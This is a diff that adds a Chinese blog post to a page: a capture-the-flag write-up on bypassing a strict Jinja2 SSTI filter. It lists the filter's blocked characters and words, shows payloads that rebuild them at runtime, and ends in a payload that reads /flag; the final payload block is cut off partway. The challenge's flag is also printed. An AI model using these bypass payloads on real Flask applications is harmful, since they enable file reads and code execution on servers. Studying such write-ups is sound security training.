@@ -3204,6 +3204,281 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-02 19:45:00+00:00">2026-11-02</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../python/" class="md-meta__link">Python</a>, 
+              <a href="../flask/" class="md-meta__link">Flask</a>, 
+              <a href="./" class="md-meta__link">SSTI</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 5 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="easysstihard-flag"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/">EasySSTI（Hard）— 不用一个标点，读出 flag</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — Jinja2 SSTI，全字符封锁</p>
+<p><strong>难度</strong>：Hard　<strong>平台</strong>：CTF2</p>
+<p><strong>Flag</strong>：<code>CTF2{c932f645-1d11-456d-bc1b-ede4eb8c0e0f}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#_1">题目概述</a></h3>
+<p>进去是个登录页。<strong>先试了个弱口令，直接就进来了。</strong></p>
+<p>页面就一个 <code>Hello, admin</code>，别的什么都没有。<strong>但题名就叫 SSTI，那还能有什么地方——<code>username</code> 被打印出来了。</strong></p>
+<p>换成 <code>{{7*7}}</code> 返回 <strong>49</strong>，实锤：<strong>注入点就是 <code>username</code>，Jinja2 模板注入。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#_2">解题过程</a></h3>
+<h4 id="step-1"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-1">Step 1：确认环境和注入点</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>{{7*7}}      →  49
+</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>{{config}}   →  &lt;Config {...}&gt;      确认 Jinja2 + Flask
+</span></code></pre></div>
+<h4 id="step-2-waf"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-2-waf">Step 2：摸 WAF</a></h4>
+<p>试 <code>{{''.__class__}}</code>，回的是：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>' in blacklist
+</span></code></pre></div>
+<p><strong>然后就是一直试、一直试，最后发现封了这些：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>字符    空格、Tab、'、"、_、.、[、]  以及单独的 |
+</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a>词      os / popen / request / class / mro / globals / builtins /
+</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>        import / read / system / eval / args / cookies / init / getitem
+</span></code></pre></div>
+<p><strong>放行的是：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>~ ( ) , : = * + - / % { } 换行 \v \f
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>attr join batch first last list items get open dict config lipsum self
+</span></code></pre></div>
+<p><strong><code>一穷二白</code>——没有引号、没有下划线、没有点、没有方括号，连空格都没有。</strong></p>
+<p><strong>但 <code>(</code> <code>)</code> <code>~</code> <code>{}</code> 还在，所以还有得打。</strong></p>
+<h4 id="step-3-vt"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-3-vt">Step 3：空格没了，用 VT</a></h4>
+<p><strong><code>{%set %}</code> 这种语句必须有空白分隔。空格和 Tab 都被拦了，那就找</strong>别的空白字符<strong>。</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>VT  0x0B   ✓ 能用
+</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a>FF  0x0C   ✓ 能用
+</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a>LF  0x0A   ✓ 能用
+</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a>Tab 0x09   ✗ 拦
+</span><span id="__span-96-5"><a id="__codelineno-96-5" name="__codelineno-96-5" href="#__codelineno-96-5"></a>空格 0x20  ✗ 拦
+</span></code></pre></div>
+<p><strong>于是 <code>{%set␋x=7*7%}{{x}}</code> → 49，语句标签全套复活。</strong></p>
+<blockquote>
+<p><strong>这里踩过一个坑：</strong><code>0x0B</code>、<code>\x0b</code>、<code>\s</code> 这三个都<strong>不是</strong>那个字符本身。</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>0x0B    数字的十六进制写法（等于 11）——{{0x0B}} 渲染出来是 11
+</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a>\x0b    字符串里的转义序列
+</span><span id="__span-97-3"><a id="__codelineno-97-3" name="__codelineno-97-3" href="#__codelineno-97-3"></a>\s      正则里的"空白类"，根本不是字符
+</span></code></pre></div>
+<p><strong>payload 里要的是</strong>那个字节本身<strong>。POST 的 body 是 urlencoded，所以写成 <code>%0B</code> 最省事。</strong></p>
+</blockquote>
+<h4 id="step-4-_-config"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-4-_-config">Step 4：把 <code>_</code> 造出来（config 字符农场）</a></h4>
+<p><strong>这一段是整题的核心。先看两个回显：</strong></p>
+<p><img alt="config 里能用的东西" src="../../../assets/images/easyssti-hard/01-config-farm.png" /></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="cp">{{</span><span class="nv">config</span><span class="o">|</span><span class="nf">list</span><span class="cp">}}</span><span class="x">                →  ['ENV', 'DEBUG', 'TESTING', ..., 'MAX_COOKIE_SIZE']</span>
+</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#__codelineno-98-2"></a><span class="cp">{{</span><span class="nv">config</span><span class="o">|</span><span class="nf">list</span><span class="o">|</span><span class="nf">last</span><span class="cp">}}</span><span class="x">           →  MAX_COOKIE_SIZE</span>
+</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#__codelineno-98-3"></a><span class="cp">{{</span><span class="nv">config</span><span class="o">|</span><span class="nf">list</span><span class="o">|</span><span class="nf">last</span><span class="o">|</span><span class="nf">batch</span><span class="o">(</span><span class="m">4</span><span class="o">)</span><span class="cp">}}</span><span class="x">  →  ['M','A','X','_'], ['C','O','O','K'], ['I','E','_','S'], ['I','Z','E']</span>
+</span></code></pre></div>
+<p><img alt="batch 分组" src="../../../assets/images/easyssti-hard/02-batch-max.png" /></p>
+<p><strong><code>|batch(4)</code> 把字符串每 4 个切成一组，第一组是 <code>['M','A','X','_']</code>。</strong></p>
+<p><strong>我们只有 <code>|first</code> 和 <code>|last</code> 两个取法，所以只能拿"每组的第一个"或"每组的最后一个"。<code>_</code> 正好在第一组的末尾：</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="cp">{{</span><span class="nv">config</span><span class="o">|</span><span class="nf">list</span><span class="o">|</span><span class="nf">last</span><span class="o">|</span><span class="nf">batch</span><span class="o">(</span><span class="m">4</span><span class="o">)|</span><span class="nf">first</span><span class="cp">}}</span><span class="x">       →  ['M','A','X','_']</span>
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a><span class="cp">{{</span><span class="nv">config</span><span class="o">|</span><span class="nf">list</span><span class="o">|</span><span class="nf">last</span><span class="o">|</span><span class="nf">batch</span><span class="o">(</span><span class="m">4</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">last</span><span class="cp">}}</span><span class="x">  →  '_'</span>
+</span></code></pre></div>
+<p><strong>由此得到通用公式：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>第 n 个字符  =  |list|batch(n)|first|last
+</span></code></pre></div>
+<p><strong>这就是 <code>[n]</code> 被封之后的替代品——不用引号、不用方括号。</strong></p>
+<h4 id="step-5"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-5">Step 5：把 <code>/</code> 也造出来</a></h4>
+<p><strong><code>/</code> 不在键名里，在</strong>值<strong>里：<code>config</code> 里有一项 <code>APPLICATION_ROOT</code> 的值是 <code>/</code>。</strong></p>
+<p><strong>要把"键值对"拿出来，得调 <code>config.items()</code>——但点被拦了，只能 <code>|attr(字符串)()</code>。</strong></p>
+<p><strong>而"items"这个词也写不出来（引号没了），于是用 <code>dict</code> 造词：</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a><span class="x">dict(items=1)              →  {'items': 1}</span>
+</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a><span class="x">dict(items=1)|join         →  items          ← 字典 join 出来是它的键</span>
+</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a><span class="x">config|attr(dict(items=1)|join)       →  &lt;built-in method items ...&gt;</span>
+</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#__codelineno-101-4"></a><span class="x">config|attr(dict(items=1)|join)()     →  dict_items([('ENV','production'), ...])</span>
+</span></code></pre></div>
+<p><strong>拿到键值对之后，<code>/</code> 在第 10 对 <code>('APPLICATION_ROOT', '/')</code> 的第二个位置：</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="cp">{{</span><span class="nv">config</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">dict</span><span class="o">(</span><span class="nv">items</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">)()|</span><span class="nf">batch</span><span class="o">(</span><span class="m">10</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">last</span><span class="o">|</span><span class="nf">last</span><span class="cp">}}</span><span class="x">   →  '/'</span>
+</span></code></pre></div>
+<p><strong><code>batch(10)|first</code> 取前 10 对，<code>|last</code> 取第 10 对，再 <code>|last</code> 取这一对的第二个元素 = <code>/</code>。</strong></p>
+<h4 id="step-6"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-6">Step 6：把 <code>.</code> 造出来</a></h4>
+<p><strong><code>.</code> 也能算：<code>1/2</code> 是 <code>0.5</code>，里面有现成的点。</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="cp">{{</span><span class="m">1</span><span class="o">/</span><span class="m">2</span><span class="cp">}}</span><span class="x">                              →  0.5</span>
+</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a><span class="cp">{{</span><span class="o">(</span><span class="m">1</span><span class="o">/</span><span class="m">2</span><span class="o">)|</span><span class="nf">string</span><span class="o">|</span><span class="nf">batch</span><span class="o">(</span><span class="m">2</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">last</span><span class="cp">}}</span><span class="x"> →  '.'</span>
+</span></code></pre></div>
+<h4 id="step-7-dict"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-7-dict">Step 7：用 <code>dict</code> + <code>~</code> 拼禁词</a></h4>
+<p><strong><code>globals</code>、<code>builtins</code>、<code>read</code>、<code>os</code>、<code>open</code>……这些词不能连着出现，拆开拼：</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a><span class="x">dict(gl=1)|join ~ dict(obals=1)|join     →  globals</span>
+</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a><span class="x">dict(built=1)|join ~ dict(ins=1)|join    →  builtins</span>
+</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a><span class="x">dict(re=1)|join ~ dict(ad=1)|join        →  read</span>
+</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a><span class="x">dict(o=1)|join ~ dict(s=1)|join          →  os</span>
+</span><span id="__span-104-5"><a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a><span class="x">dict(open=1)|join                        →  open（不封，直接用）</span>
+</span><span id="__span-104-6"><a id="__codelineno-104-6" name="__codelineno-104-6" href="#__codelineno-104-6"></a><span class="x">dict(get=1)|join                         →  get（不封）</span>
+</span></code></pre></div>
+<p><strong>注意 <code>~</code> 是</strong>字符串拼接<strong>：<code>{{1~2}}</code> → <code>'12'</code>，而 <code>{{1+2}}</code> → <code>3</code>。</strong></p>
+<p><strong>也注意别拼错：<code>gl</code> + <code>obals</code> = <code>globals</code>，不是 <code>gl</code> + <code>oblas</code>。</strong></p>
+<h4 id="step-8"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-8">Step 8：组装</a></h4>
+<p><strong>把造出来的东西存进变量（<code>set</code> 就是赋值，只存不显示）：</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">U</span><span class="o">=</span><span class="nv">config</span><span class="o">|</span><span class="nf">last</span><span class="o">|</span><span class="nf">list</span><span class="o">|</span><span class="nf">batch</span><span class="o">(</span><span class="m">4</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">last</span><span class="cp">%}</span><span class="x">                      U  = _</span>
+</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">GS</span><span class="o">=</span><span class="nv">U</span><span class="o">~</span><span class="nv">U</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">gl</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">obals</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">U</span><span class="o">~</span><span class="nv">U</span><span class="cp">%}</span><span class="x">               GS = __globals__</span>
+</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">GT</span><span class="o">=</span><span class="nv">dict</span><span class="o">(</span><span class="nv">get</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="cp">%}</span><span class="x">                                         GT = get</span>
+</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#__codelineno-105-4"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">BB</span><span class="o">=</span><span class="nv">U</span><span class="o">~</span><span class="nv">U</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">built</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">ins</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">U</span><span class="o">~</span><span class="nv">U</span><span class="cp">%}</span><span class="x">              BB = __builtins__</span>
+</span><span id="__span-105-5"><a id="__codelineno-105-5" name="__codelineno-105-5" href="#__codelineno-105-5"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">SL</span><span class="o">=</span><span class="nv">config</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">dict</span><span class="o">(</span><span class="nv">items</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">)()|</span><span class="nf">batch</span><span class="o">(</span><span class="m">10</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">last</span><span class="o">|</span><span class="nf">last</span><span class="cp">%}</span><span class="x">  SL = /</span>
+</span><span id="__span-105-6"><a id="__codelineno-105-6" name="__codelineno-105-6" href="#__codelineno-105-6"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">RD</span><span class="o">=</span><span class="nv">dict</span><span class="o">(</span><span class="nv">re</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">ad</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="cp">%}</span><span class="x">                          RD = read</span>
+</span></code></pre></div>
+<p><strong>最后一步：</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a><span class="cp">{{</span><span class="nv">lipsum</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">GS</span><span class="o">)|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">GT</span><span class="o">)(</span><span class="nv">BB</span><span class="o">)|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">GT</span><span class="o">)(</span><span class="nv">dict</span><span class="o">(</span><span class="nv">open</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">)(</span><span class="nv">SL</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">flag</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">)|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">RD</span><span class="o">)()</span><span class="cp">}}</span>
+</span></code></pre></div>
+<p><strong>等价于：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'open'</span><span class="p">)(</span><span class="s1">'/flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></code></pre></div>
+<h4 id="step-9-ls"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#step-9-ls">Step 9：其实应该先 ls</a></h4>
+<p><strong>WP 里直接写 <code>/flag</code> 是"flag 常在根目录"的经验假设。正经做法是先列目录：</strong></p>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a><span class="x">lipsum.__globals__['os'].listdir('/')</span>
+</span></code></pre></div>
+<p><strong><code>os</code> 居然就在 <code>jinja2.utils</code> 的 globals 里（jinja2 内部 import 了 os），所以不用碰 <code>__import__</code>（<code>import</code> 是禁词，那条路更难）。</strong></p>
+<p><strong>清单：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>['opt','root','media','home','proc','tmp','lib','boot','etc','lib64','dev','sys','sbin',...]
+</span></code></pre></div>
+<p><strong>先看目录、再决定读哪个文件——这个习惯比"猜文件名"值钱。</strong></p>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>登录页 → 弱口令进来 → Hello admin → username 被渲染
+</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>  → {{7*7}} = 49 → 注入点确认
+</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a>    → 摸 WAF：空格 Tab ' " _ . [ ] 全封，一批词也封
+</span><span id="__span-110-4"><a id="__codelineno-110-4" name="__codelineno-110-4" href="#__codelineno-110-4"></a>      → 空白用 VT(0x0B)：{%set␋x=7*7%} 复活
+</span><span id="__span-110-5"><a id="__codelineno-110-5" name="__codelineno-110-5" href="#__codelineno-110-5"></a>        → _ 从 config 的键里切（batch 取位）
+</span><span id="__span-110-6"><a id="__codelineno-110-6" name="__codelineno-110-6" href="#__codelineno-110-6"></a>          → / 从 config.items() 的第 10 对里切
+</span><span id="__span-110-7"><a id="__codelineno-110-7" name="__codelineno-110-7" href="#__codelineno-110-7"></a>            → . 从 1/2 的 0.5 里切
+</span><span id="__span-110-8"><a id="__codelineno-110-8" name="__codelineno-110-8" href="#__codelineno-110-8"></a>              → 禁词用 dict(单键)|join + ~ 拼
+</span><span id="__span-110-9"><a id="__codelineno-110-9" name="__codelineno-110-9" href="#__codelineno-110-9"></a>                → set 存变量，|attr() 链代替点和方括号
+</span><span id="__span-110-10"><a id="__codelineno-110-10" name="__codelineno-110-10" href="#__codelineno-110-10"></a>                  → lipsum.__globals__['__builtins__'].get('open')('/flag').read()
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#_4">漏洞原理</a></h4>
+<p><strong>① WAF 拦的是"字面"，引擎看的是"值"</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>原文里：dict(gl=1)|join~dict(obals=1)|join
+</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a>执行时：globals
+</span></code></pre></div>
+<p><strong>所有被禁的词、被禁的字符，都能在运行时"算"出来。</strong></p>
+<p><strong>② 三个被封的字符，三个不同的"农场"</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>_   从 config 的键名里切（MAX_COOKIE_SIZE 第 4 个）
+</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#__codelineno-112-2"></a>/   从 config.items() 的值里切（APPLICATION_ROOT 的值）
+</span><span id="__span-112-3"><a id="__codelineno-112-3" name="__codelineno-112-3" href="#__codelineno-112-3"></a>.   从 1/2 = 0.5 里切
+</span></code></pre></div>
+<p><strong>只要有</strong>任何<strong>一处能产出那个字符，就能把它切出来复用。</strong></p>
+<p><strong>③ <code>|attr</code> 只走 <code>getattr</code>，字典取键要靠 <code>get</code></strong></p>
+<p><strong>Jinja 的 <code>|attr</code> 不回落 <code>__getitem__</code>，所以 <code>__globals__['__builtins__']</code> 得写成 <code>|attr('get')('__builtins__')</code>。</strong></p>
+<h4 id="_5"><a class="toclink" href="../../easyssti-hard-jinja-no-punct/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>{%set␋x=1%}</code></td>
+<td><code>set</code> 是赋值；空白用 VT/FF/LF，空格和 Tab 都被拦</td>
+</tr>
+<tr>
+<td><code>0x0B</code> / <code>\x0b</code> / <code>\s</code></td>
+<td><strong>都不是那个字节</strong>：数字写法、字符串转义、正则空白类</td>
+</tr>
+<tr>
+<td><code>%0B</code></td>
+<td>urlencoded body 里写这个，服务端解码成真字节</td>
+</tr>
+<tr>
+<td><code>\|batch(n)\|first\|last</code></td>
+<td><strong>取第 n 个字符</strong>，替代 <code>[n]</code></td>
+</tr>
+<tr>
+<td><code>dict(k=1)\|join</code></td>
+<td>造出字符串 <code>k</code>（字典 join = 拼键）</td>
+</tr>
+<tr>
+<td><code>~</code></td>
+<td>字符串拼接（<code>1~2</code> → <code>'12'</code>）</td>
+</tr>
+<tr>
+<td><code>\|attr(name)</code></td>
+<td>替代 <code>.name</code></td>
+</tr>
+<tr>
+<td><code>\|attr('get')(key)</code></td>
+<td>替代 <code>[key]</code>（attr 不回落 getitem）</td>
+</tr>
+<tr>
+<td><code>\|attr(f)()</code></td>
+<td>方法必须加 <code>()</code> 才是调用</td>
+</tr>
+<tr>
+<td>禁词拆分</td>
+<td><code>gl</code>+<code>obals</code>、<code>built</code>+<code>ins</code>、<code>re</code>+<code>ad</code>、<code>o</code>+<code>s</code></td>
+</tr>
+<tr>
+<td><code>os</code> 在哪</td>
+<td><code>jinja2.utils.__globals__</code> 里就有，不用 <code>__import__</code></td>
+</tr>
+<tr>
+<td>先 ls 再读</td>
+<td><code>os.listdir('/')</code>，别假设文件名</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整 payload（实测，␋ = 0x0B）</summary>
+<div class="language-jinja highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">U</span><span class="o">=</span><span class="nv">config</span><span class="o">|</span><span class="nf">last</span><span class="o">|</span><span class="nf">list</span><span class="o">|</span><span class="nf">batch</span><span class="o">(</span><span class="m">4</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">last</span><span class="cp">%}</span>
+</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">GS</span><span class="o">=</span><span class="nv">U</span><span class="o">~</span><span class="nv">U</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">gl</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">obals</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">U</span><span class="o">~</span><span class="nv">U</span><span class="cp">%}</span>
+</span><span id="__span-113-3"><a id="__codelineno-113-3" name="__codelineno-113-3" href="#__codelineno-113-3"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">GT</span><span class="o">=</span><span class="nv">dict</span><span class="o">(</span><span class="nv">get</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="cp">%}</span>
+</span><span id="__span-113-4"><a id="__codelineno-113-4" name="__codelineno-113-4" href="#__codelineno-113-4"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">BB</span><span class="o">=</span><span class="nv">U</span><span class="o">~</span><span class="nv">U</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">built</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">ins</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">U</span><span class="o">~</span><span class="nv">U</span><span class="cp">%}</span>
+</span><span id="__span-113-5"><a id="__codelineno-113-5" name="__codelineno-113-5" href="#__codelineno-113-5"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">SL</span><span class="o">=</span><span class="nv">config</span><span class="o">|</span><span class="nf">attr</span><span class="o">(</span><span class="nv">dict</span><span class="o">(</span><span class="nv">items</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">)()|</span><span class="nf">batch</span><span class="o">(</span><span class="m">10</span><span class="o">)|</span><span class="nf">first</span><span class="o">|</span><span class="nf">last</span><span class="o">|</span><span class="nf">last</span><span class="cp">%}</span>
+</span><span id="__span-113-6"><a id="__codelineno-113-6" name="__codelineno-113-6" href="#__codelineno-113-6"></a><span class="cp">{%</span><span class="k">set</span><span class="p">␋</span><span class="nv">RD</span><span class="o">=</span><span class="nv">dict</span><span class="o">(</span><span class="nv">re</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="o">~</span><span class="nv">dict</span><span class="o">(</span><span class="nv">ad</span><span class="o">=</span><span class="m">1</span><span class="o">)|</span><span class="nf">join</span><span class="cp">%}</span>
